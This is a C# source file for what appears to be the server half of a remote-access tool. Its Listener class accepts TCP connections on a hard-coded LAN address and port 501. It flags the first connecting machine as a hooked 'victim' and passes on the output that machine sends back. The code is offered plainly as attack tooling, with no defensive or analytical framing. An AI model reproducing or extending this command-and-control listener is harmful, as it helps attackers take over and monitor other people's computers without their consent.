using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace PS03_Server
{
    public class Listener
    {
        public delegate void OutputReadyHandler(string data);
        public delegate void VictimConnectedHandler(string data);
        public event OutputReadyHandler OnOutputReady;

        public event VictimConnectedHandler OnVictimConnected;
        private bool VictimHooked = false;

        public void HandleOutputReady(string output)
        {
            OnOutputReady?.Invoke(output);
        }

        public void HandleVictimConnected(string victim)
        {
            OnVictimConnected?.Invoke(victim);
        }

        public void start()
        {
            TcpListener listener = new TcpListener(IPAddress.Parse("192.168.1.77"), 501);
            listener.Start();
            while (true)
            {
                Socket client = listener.AcceptSocket();
                if(!VictimHooked)
                {
                    IPEndPoint remoteIpEndPoint = client.RemoteEndPoint as IPEndPoint;
                    HandleVictimConnected(remoteIpEndPoint.Address.ToString());
                    VictimHooked = true;

                }

                var childSocketThread = new Thread(() =>
                {
                    byte[] data = new byte[5000000];
                    int size = client.Receive(data);

                    string rcv = "";
                    for (int i = 0; i < size; i++)
                        rcv += (Convert.ToChar(data[i]));
                    
                    HandleOutputReady(rcv);

                    client.Close();
                });
                childSocketThread.Start();
            }
        }
    }
}
